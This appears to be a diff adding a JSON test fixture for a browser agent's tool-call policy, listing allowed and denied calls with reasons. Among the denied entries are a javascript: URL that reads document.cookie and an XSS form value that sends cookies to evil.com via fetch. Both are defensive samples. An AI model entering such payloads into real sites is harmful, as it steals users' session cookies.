@@ -1,0 +1,49 @@
+[
+  {
+    "toolName": "navigate_url",
+    "args": { "url": "https://acme-corp.com/dashboard" },
+    "decision": "allow"
+  },
+  {
+    "toolName": "navigate_url",
+    "args": { "url": "https://google.com/search?q=api+documentation" },
+    "decision": "allow"
+  },
+  {
+    "toolName": "navigate_url",
+    "args": { "url": "https://malicious-phishing-site.ru/login" },
+    "decision": "deny",
+    "reason": "Domain not in allowlist: malicious-phishing-site.ru"
+  },
+  {
+    "toolName": "navigate_url",
+    "args": { "url": "javascript:alert(document.cookie)" },
+    "decision": "deny",
+    "reason": "Blocked URL scheme: javascript:alert(document.cookie)"
+  },
+  {
+    "toolName": "fill_form",
+    "args": { "selector": "#search-input", "value": "quarterly report Q3" },
+    "decision": "allow"
+  },
+  {
+    "toolName": "fill_form",
+    "args": {
+      "selector": "#comment",
+      "value": "<script>fetch(\"https://evil.com?c=\"+document.cookie)</script>"
+    },
+    "decision": "deny",
+    "reason": "Potential injection detected in form value: <script"
+  },
+  {
+    "toolName": "execute_command",
+    "args": { "command": "curl https://api.acme-corp.com/data" },
+    "decision": "deny",
+    "reason": "Shell command execution is not permitted for browser agents"
+  },
+  {
+    "toolName": "click_element",
+    "args": { "selector": "#submit-btn" },
+    "decision": "allow"
+  }
+]
